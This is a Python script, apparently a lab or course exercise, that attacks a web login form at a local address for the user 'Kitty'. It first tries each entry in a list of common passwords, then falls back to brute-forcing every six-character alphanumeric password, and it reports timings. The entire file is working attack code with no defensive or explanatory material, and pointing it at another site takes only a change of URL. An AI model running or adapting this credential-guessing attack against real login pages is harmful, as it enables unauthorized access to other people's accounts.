import requests
import itertools
import string
import time

login_url = "http://127.0.0.1:5000/"
username = "Kitty"
password_file = "10k-most-common.txt"
password_length = 6

def try_login(username, password):
    data = {"username": username, "password": password}
    try:
        response = requests.post(login_url, data=data)
        if "home" in response.url or "/home" in response.url:
            return True
    except requests.RequestException:
        pass
    return False


#Phase 1: Dictionary Attack
def try_common_passwords():
    print("Dictionary attack started...")
    start_time = time.time()

    try:
        with open(password_file, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                password = line.strip()
                print(f"Trying password: {password}", end="\r")

                if try_login(username, password):
                    end_time = time.time()
                    print(f"\nLogin successful! Username: {username} | Password: {password}")
                    print(f"Dictionary attack time: {end_time - start_time:.2f} seconds")
                    return True
    except FileNotFoundError:
        print(f"Password dictionary file: '{password_file}' not found")

    end_time = time.time()
    print(f"\nDictionary attack failed, time spent: {end_time - start_time:.2f} seconds")
    return False


#Phase 2: Exhaustive Search Attack
def Exhaustive_search():
    print("\nExhaustive search attack started...")
    start_time = time.time()

    chars = string.ascii_letters + string.digits

    for character in itertools.product(chars, repeat=password_length):
        password = ''.join(character)
        if try_login(username, password):
            end_time = time.time()
            print(f"\nLogin successful! Username: {username} | Password: {password}")
            print(f"Exhaustive search attack time: {end_time - start_time:.2f} seconds")
            return True

    end_time = time.time()
    print(f"\nExhaustive search attack failed, time spent: {end_time - start_time:.2f} seconds")
    return False


def main():
    total_start = time.time()
    print(f"Starting password cracking for user '{username}'...")

    if try_common_passwords():
        pass
    else:
        print("Dictionary attack failed, starting exhaustive search attack...")
        Exhaustive_search()

    total_end = time.time()
    print(f"\nTotal time spent: {total_end - total_start:.2f} seconds")


if __name__ == "__main__":
    main()